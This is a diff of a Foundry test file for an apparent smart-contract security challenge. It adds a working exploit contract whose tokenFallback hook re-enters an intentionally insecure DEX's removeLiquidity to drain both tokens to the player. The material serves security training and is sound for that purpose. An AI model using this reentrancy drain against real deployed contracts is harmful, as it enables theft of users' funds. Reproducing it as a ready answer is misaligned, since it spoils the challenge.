@@ -9,6 +9,7 @@ import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
 
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 
 contract Challenge2Test is Test {
     InsecureDexLP target; 
@@ -49,8 +50,23 @@ contract Challenge2Test is Test {
         //////////////////////////////*/      
 
         //============================//
+        Exploit exploit = new Exploit();
+        
+        exploit.setAll(address(token0), address(token1), target);
+
+        token0.approve(address(exploit), 1 ether);
+        token0.transfer(address(exploit), 1 ether);
+        token1.approve(address(exploit), 1 ether);
+        token1.transfer(address(exploit), 1 ether);
+        
+        exploit.hack();
+        exploit.hack2();
+        exploit.sendTo(player);
 
         vm.stopPrank();
+
+        console.log(token1.balanceOf(player));
+        console.log(token0.balanceOf(player));
 
         assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
         assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
@@ -68,7 +84,57 @@ contract Challenge2Test is Test {
 
 
 contract Exploit {
-    IERC20 public token0; // this is insecureumToken
-    IERC20 public token1; // this is simpleERC223Token
+
+    address public owner;
+    uint public amount = 0;
+    IERC20 public token0;
+    IERC20 public token1;
     InsecureDexLP public dex;
+
+  constructor() public payable {
+    owner = msg.sender;  
+  }
+
+    function setAll(address zeroToken, address firstToken, InsecureDexLP dex1) public payable {
+        token0 = IERC20(zeroToken); 
+        token1 = IERC20(firstToken);
+        dex = dex1;
+    }
+
+    function hack() external {  
+        token0.approve(address(dex), 10 ether);
+        token1.approve(address(dex), 10 ether);
+        dex.addLiquidity(1 ether, 1 ether);
+    }
+
+    function hack2() external {  
+        token0.approve(address(dex), 10 ether);
+        token1.approve(address(dex), 10 ether);
+        dex.removeLiquidity(1 ether);
+    }
+
+    function sendTo(address player) external {
+        token0.approve(address(dex), 10 ether);
+        token1.approve(address(dex), 10 ether);
+        token0.transfer(owner, 10 ether);
+        token1.transfer(owner, 10 ether);
+    }
+
+    function tokenFallback(address sender, uint256 value, bytes memory) external {
+
+        if (sender == owner) {
+            amount += value;
+        } else {
+            if (token1.balanceOf(address(this)) < 10 ether) {
+                console.log("dex token 1 {}", token1.balanceOf(address(dex)));
+                console.log("dex token 0 {}", token0.balanceOf(address(dex)));
+                console.log("contract token 1 {}", token1.balanceOf(address(this)));
+                console.log("contract token 0 {}", token0.balanceOf(address(this)));
+                console.log("player token 1 {}", token1.balanceOf(owner));
+                console.log("player token 0 {}", token0.balanceOf(owner));
+                dex.removeLiquidity(1 ether);
+            }
+        }
+
+    }
 }
